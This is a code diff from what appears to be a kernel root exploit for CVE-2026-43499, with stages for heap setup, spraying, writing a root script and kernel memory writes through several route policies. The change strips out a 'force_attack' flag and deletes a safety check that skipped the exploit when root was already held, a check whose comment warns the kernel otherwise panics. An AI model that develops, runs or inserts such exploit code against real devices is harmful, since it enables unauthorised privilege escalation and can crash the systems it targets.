@@ -839,7 +839,7 @@ namespace ghostlock::session::backend {
     /* Stage: process setup and profile installation. */
     StageResult Cve2026_43499Policy::run_setup(ExploitSession &session,
                                                const profile::kernel_offsets &decoded,
-                                               const char *debug_dir, bool force_attack) {
+                                               const char *debug_dir) {
         session.heap.init();
         support::disable_rseq_for_thread();
         kernel::set_unbuffer();
@@ -860,17 +860,6 @@ namespace ghostlock::session::backend {
          * absence of spray lines. */
         pr_info("page_free=%d reason=%s\n",
                 support::page_free_run() ? 1 : 0, support::page_free_reason());
-        /* Robustness guard: running the attack where KernelSU already owns root
-         * drives the re-enforce path that panics the kernel at the first PI
-         * route, and the objective is already met. Bail out cleanly instead; a
-         * cold boot clears the module for a real run. The forced test skips
-         * this check on purpose and relies on the root script discarding the
-         * child. */
-        if (!force_attack && ksu_root_owned()) {
-            pr_warning("KernelSU already has root; skipping exploit "
-                "(cold boot for a clean run, or enable the forced test)\n");
-            return StageResult::Done;
-        }
         attack::write_root_script();
 
         attack::apply_iomem_cache();
@@ -947,9 +936,9 @@ namespace ghostlock::session::backend {
     template <class M>
     StageResult Cve2026_43499Policy::run(ExploitSession &session,
                                          const profile::kernel_offsets &decoded,
-                                         const char *debug_dir, bool force_attack,
+                                         const char *debug_dir,
                                          VictimChain &chain) {
-        switch (run_setup(session, decoded, debug_dir, force_attack)) {
+        switch (run_setup(session, decoded, debug_dir)) {
             case StageResult::Failed:
                 return StageResult::Failed;
             case StageResult::Done:
@@ -1012,13 +1001,13 @@ namespace ghostlock::session::backend {
     /* Explicit instantiations: the catalogued middleware policies. Callers only
      * include the header; the definitions stay in this unit. */
     template StageResult Cve2026_43499Policy::run<route::SelectPolicy>(
-        ExploitSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);
+        ExploitSession &, const profile::kernel_offsets &, const char *, VictimChain &);
     template StageResult Cve2026_43499Policy::run<route::TcpPolicy>(
-        ExploitSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);
+        ExploitSession &, const profile::kernel_offsets &, const char *, VictimChain &);
     template StageResult Cve2026_43499Policy::run<route::MulticastPolicy>(
-        ExploitSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);
+        ExploitSession &, const profile::kernel_offsets &, const char *, VictimChain &);
     template StageResult Cve2026_43499Policy::run<route::SigreturnPolicy>(
-        ExploitSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);
+        ExploitSession &, const profile::kernel_offsets &, const char *, VictimChain &);
 
     template Status Cve2026_43499Policy::attack_write<route::SelectPolicy>(
         ExploitSession &, const memory::WriteRequest &, const char *);
